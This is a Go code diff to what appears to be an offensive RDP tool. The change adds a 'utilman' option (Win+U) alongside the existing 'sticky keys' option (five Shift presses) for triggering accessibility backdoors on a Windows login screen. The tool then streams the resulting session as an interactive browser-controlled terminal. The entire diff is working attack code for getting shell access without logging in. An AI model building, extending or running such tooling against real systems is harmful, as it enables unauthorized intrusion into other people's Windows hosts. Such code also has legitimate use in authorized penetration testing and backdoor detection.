@@ -66,10 +66,11 @@ func openBrowser(url string) {
 
 // sessionManager holds the active RDP session and allows reconnection.
 type sessionManager struct {
-	mu      sync.RWMutex
-	sess    *InteractiveSession
-	target  string
-	timeout time.Duration
+	mu           sync.RWMutex
+	sess         *InteractiveSession
+	target       string
+	timeout      time.Duration
+	backdoorType BackdoorType
 }
 
 // Session returns the current active session.
@@ -105,18 +106,42 @@ func (m *sessionManager) Reconnect(ctx context.Context) error {
 	time.Sleep(3 * time.Second)
 	newSess.WaitForFrame(2 * time.Second)
 
-	// Trigger sticky keys (5x Shift)
-	for i := 0; i < 5; i++ {
-		if sendErr := newSess.SendKey(leftShiftScancode, true); sendErr != nil {
+	// Trigger the appropriate backdoor
+	if m.backdoorType == BackdoorUtilman {
+		// Trigger utilman (Win+U)
+		if sendErr := newSess.SendKey(leftWinScancode, true); sendErr != nil {
 			newSess.Close()
-			return fmt.Errorf("shift press: %w", sendErr)
+			return fmt.Errorf("win key press: %w", sendErr)
 		}
 		time.Sleep(50 * time.Millisecond)
-		if sendErr := newSess.SendKey(leftShiftScancode, false); sendErr != nil {
+		if sendErr := newSess.SendKey(uKeyScancode, true); sendErr != nil {
 			newSess.Close()
-			return fmt.Errorf("shift release: %w", sendErr)
+			return fmt.Errorf("u key press: %w", sendErr)
 		}
 		time.Sleep(50 * time.Millisecond)
+		if sendErr := newSess.SendKey(uKeyScancode, false); sendErr != nil {
+			newSess.Close()
+			return fmt.Errorf("u key release: %w", sendErr)
+		}
+		time.Sleep(50 * time.Millisecond)
+		if sendErr := newSess.SendKey(leftWinScancode, false); sendErr != nil {
+			newSess.Close()
+			return fmt.Errorf("win key release: %w", sendErr)
+		}
+	} else {
+		// Trigger sticky keys (5x Shift)
+		for i := 0; i < 5; i++ {
+			if sendErr := newSess.SendKey(leftShiftScancode, true); sendErr != nil {
+				newSess.Close()
+				return fmt.Errorf("shift press: %w", sendErr)
+			}
+			time.Sleep(50 * time.Millisecond)
+			if sendErr := newSess.SendKey(leftShiftScancode, false); sendErr != nil {
+				newSess.Close()
+				return fmt.Errorf("shift release: %w", sendErr)
+			}
+			time.Sleep(50 * time.Millisecond)
+		}
 	}
 
 	time.Sleep(1 * time.Second)
@@ -135,10 +160,18 @@ func (m *sessionManager) Close() {
 	}
 }
 
-// RunWebTerminal connects to an RDP target via sticky keys and serves an
+// BackdoorType indicates which backdoor to trigger in web terminal mode.
+type BackdoorType string
+
+const (
+	BackdoorStickyKeys BackdoorType = "stickykeys"
+	BackdoorUtilman    BackdoorType = "utilman"
+)
+
+// RunWebTerminal connects to an RDP target via sticky keys or utilman and serves an
 // interactive web terminal on localhost. Opens a browser-controllable RDP
 // session with live screen streaming, keyboard, and mouse input.
-func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, openInBrowser bool) error {
+func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, openInBrowser bool, backdoorType BackdoorType) error {
 	fmt.Fprintf(os.Stderr, "[*] Connecting to %s for interactive web terminal...\n", target)
 
 	sess, err := NewInteractiveSession(ctx, target, timeout, 1024, 768)
@@ -147,9 +180,10 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	}
 
 	mgr := &sessionManager{
-		sess:    sess,
-		target:  target,
-		timeout: timeout,
+		sess:         sess,
+		target:       target,
+		timeout:      timeout,
+		backdoorType: backdoorType,
 	}
 	defer mgr.Close()
 
@@ -158,17 +192,36 @@ func RunWebTerminal(ctx context.Context, target string, timeout time.Duration, o
 	time.Sleep(3 * time.Second)
 	sess.WaitForFrame(2 * time.Second)
 
-	// Trigger sticky keys
-	fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift to trigger sticky keys...\n")
-	for i := 0; i < 5; i++ {
-		if sendErr := sess.SendKey(leftShiftScancode, true); sendErr != nil {
-			return fmt.Errorf("shift press: %w", sendErr)
+	// Trigger the appropriate backdoor
+	if backdoorType == BackdoorUtilman {
+		fmt.Fprintf(os.Stderr, "[*] Sending Win+U to trigger utilman...\n")
+		if sendErr := sess.SendKey(leftWinScancode, true); sendErr != nil {
+			return fmt.Errorf("win key press: %w", sendErr)
 		}
 		time.Sleep(50 * time.Millisecond)
-		if sendErr := sess.SendKey(leftShiftScancode, false); sendErr != nil {
-			return fmt.Errorf("shift release: %w", sendErr)
+		if sendErr := sess.SendKey(uKeyScancode, true); sendErr != nil {
+			return fmt.Errorf("u key press: %w", sendErr)
 		}
 		time.Sleep(50 * time.Millisecond)
+		if sendErr := sess.SendKey(uKeyScancode, false); sendErr != nil {
+			return fmt.Errorf("u key release: %w", sendErr)
+		}
+		time.Sleep(50 * time.Millisecond)
+		if sendErr := sess.SendKey(leftWinScancode, false); sendErr != nil {
+			return fmt.Errorf("win key release: %w", sendErr)
+		}
+	} else {
+		fmt.Fprintf(os.Stderr, "[*] Sending 5x Shift to trigger sticky keys...\n")
+		for i := 0; i < 5; i++ {
+			if sendErr := sess.SendKey(leftShiftScancode, true); sendErr != nil {
+				return fmt.Errorf("shift press: %w", sendErr)
+			}
+			time.Sleep(50 * time.Millisecond)
+			if sendErr := sess.SendKey(leftShiftScancode, false); sendErr != nil {
+				return fmt.Errorf("shift release: %w", sendErr)
+			}
+			time.Sleep(50 * time.Millisecond)
+		}
 	}
 
 	time.Sleep(1 * time.Second)
